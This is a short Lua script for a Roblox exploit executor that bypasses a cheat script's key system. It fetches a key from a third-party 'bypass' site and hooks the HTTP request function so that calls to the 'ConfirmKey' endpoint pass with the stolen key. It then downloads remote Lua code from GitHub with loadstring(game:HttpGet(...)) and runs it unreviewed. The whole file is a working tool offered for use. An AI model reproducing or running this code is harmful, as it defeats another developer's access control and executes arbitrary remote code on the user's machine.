--[[ TYPE IN GRIMCITY IN INPUT AND HIT CHECK KEY ]] --

local key = game:HttpGet("https://soggyware-bypass.vercel.app/08934289034890342980324980?t=nightside")

request = http_request or request or HttpPost or syn.request

function toJson(string)
    local jsonData = nil
    local s, err = pcall(function() 
        local jsonTry = game:GetService("HttpService"):JSONDecode(string)  
        jsonData = jsonTry
    end)   
    return jsonData or false
end

key = toJson(key).key

local old


old = hookfunction(request, newcclosure(function(req)
    if string.find(req.Url, "ConfirmKey") then
        req.Url = "https://night-side-lelandcoding.vercel.app/api/Key/ConfirmKey?key="..key
        return old(req)
    end
   return old(req) 
end))

loadstring(game:HttpGet('https://raw.githubusercontent.com/TrustsenseDev/Utilities/main/Premier.lua', true))()